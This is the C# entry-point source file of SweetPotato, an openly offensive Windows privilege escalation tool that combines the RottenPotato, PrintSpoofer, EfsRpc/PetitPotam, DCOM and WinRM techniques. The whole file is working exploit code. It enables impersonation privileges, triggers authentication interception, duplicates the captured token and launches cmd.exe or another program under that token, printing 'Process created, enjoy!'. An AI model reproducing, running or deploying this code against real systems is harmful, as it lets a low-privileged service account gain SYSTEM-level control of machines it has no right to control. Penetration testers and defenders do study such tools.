using Mono.Options;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using static SweetPotato.ImpersonationToken;

namespace SweetPotato {
    class Program {

        static void PrintHelp(OptionSet options) {                
            options.WriteOptionDescriptions(Console.Out);
        }

        static void Main(string[] args) {

            string clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
            ushort port = 6666;
            string program = @"c:\Windows\System32\cmd.exe";
            string programArgs = null;
            ExecutionMethod executionMethod = ExecutionMethod.Auto;
            PotatoAPI.Mode mode = PotatoAPI.Mode.PrintSpoofer;
            bool showHelp = false;
            RpcTransport rpcTransport = RpcTransport.ncalrpc;
            RpcInterface rpcInterface = RpcInterface.efsrpc; // EfsRpc only

            Console.WriteLine(
                "SweetPotato by @_EthicalChaos_\n" +
                 "  Orignal RottenPotato code and exploit by @foxglovesec\n" +
                 "  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n" + 
                 "  PrintSpoofer discovery and original exploit by @itm4n\n" +
                 "  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam"
                );

            OptionSet option_set = new OptionSet()
                .Add<string>("c=|clsid=", "CLSID (default BITS: 4991D34B-80A1-4291-83B6-3328366B9097)", v => clsId = v)
                .Add<ExecutionMethod>("m=|method=", "Auto,User,Thread (default Auto)", v => executionMethod = v)
                .Add("p=|prog=", "Program to launch (default cmd.exe)", v => program = v)
                .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
                .Add<PotatoAPI.Mode>("e=|exploit=", "Exploit mode [DCOM|WinRM|EfsRpc|PrintSpoofer(default)] ", v => mode = v)
                .Add<ushort>("l=|listenPort=", "COM server listen port (default 6666)", v => port = v)
                .Add<RpcTransport>("t=|rpcTransport=", "RPC transport [ncalrpc|ncacn_np] (default: ncalrpc)", v => rpcTransport = v)
                .Add<RpcInterface>("i=|rpcInterface=", "EfsRpc interface [efsrpc|lsarpc] (default: efsrpc)", v => rpcInterface = v)
                .Add("h|help", "Display this help", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (showHelp) {
                    PrintHelp(option_set);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                PrintHelp(option_set);
                return;
            }

            try {

                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);

                if(!hasImpersonate && !hasPrimary) {
                    Console.WriteLine("[!] Cannot perform interception, necessary privileges missing.  Are you running under a Service account?");
                    return;
                }

                if (executionMethod == ExecutionMethod.Auto) {
                    if (hasImpersonate) {
                        executionMethod = ExecutionMethod.Token;
                    } else if (hasPrimary) {
                        executionMethod = ExecutionMethod.User;
                    }
                }

                PotatoAPI potatoAPI = null;

                switch (mode) {
                    case PotatoAPI.Mode.EfsRpc:
                        Console.WriteLine($"[+] Attempting NP impersonation using method EfsRpc using method {executionMethod} to launch {program}");
                        potatoAPI = new EfsRpcAPI(rpcTransport, rpcInterface);
                        break;
                    case PotatoAPI.Mode.PrintSpoofer:
                        Console.WriteLine($"[+] Attempting NP impersonation using method PrintSpoofer using method {executionMethod} to launch {program}");
                        potatoAPI = new PrintSpooferAPI(rpcTransport);
                        break;
                    case PotatoAPI.Mode.DCOM:
                        Console.WriteLine($"[+] Attempting DCOM NTLM interception with CLID {clsId} on port {port} using method {executionMethod} to launch {program}");
                        potatoAPI = new COMAPI(clsId, port);
                        break;
                    case PotatoAPI.Mode.WinRM:
                        Console.WriteLine($"[+] Attempting WinRM NTLM interception with CLID {clsId} on port {port} using method {executionMethod} to launch {program}");
                        potatoAPI = new WinRMAPI(clsId, port);
                        break;

                    default:
                        return;
                }

                if (!potatoAPI.Trigger()) {
                    Console.WriteLine("[!] No authenticated interception took place, exploit failed");
                    return;
                }

                Console.WriteLine("[+] Intercepted and authenticated successfully, launching program");

                IntPtr impersonatedPrimary;

                if (!DuplicateTokenEx(potatoAPI.Token, TOKEN_ALL_ACCESS, IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, TOKEN_TYPE.TokenPrimary, out impersonatedPrimary)) {
                    Console.WriteLine("[!] Failed to impersonate security context token");
                    return;
                }

                Thread systemThread = new Thread(() => {
                    SetThreadToken(IntPtr.Zero, potatoAPI.Token);
                    STARTUPINFO si = new STARTUPINFO();
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = @"WinSta0\Default";

                    //Console.WriteLine("[+] Created launch thread using impersonated user {0}", WindowsIdentity.GetCurrent(true).Name);

                    string finalArgs = null;

                    if(programArgs != null)
                        finalArgs = string.Format("\"{0}\" {1}", program, programArgs);

                    if (executionMethod == ExecutionMethod.Token) {
                        if (!CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi)) {
                            Console.WriteLine("[!] Failed to created impersonated process with token: {0}", Marshal.GetLastWin32Error());
                            return;
                        }
                    } else {
                        if (!CreateProcessAsUserW(impersonatedPrimary, program, finalArgs, IntPtr.Zero,
                            IntPtr.Zero, false, CREATE_NEW_CONSOLE, IntPtr.Zero, @"C:\", ref si, out pi)) {
                            Console.WriteLine("[!] Failed to created impersonated process with user: {0} ", Marshal.GetLastWin32Error());
                            return;
                        }
                    }
                    Console.WriteLine("[+] Process created, enjoy!");
                });

                systemThread.Start();
                systemThread.Join();

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to exploit: {0} ", e.Message);
                Console.WriteLine(e.StackTrace.ToString());
            }
        }
    }
}
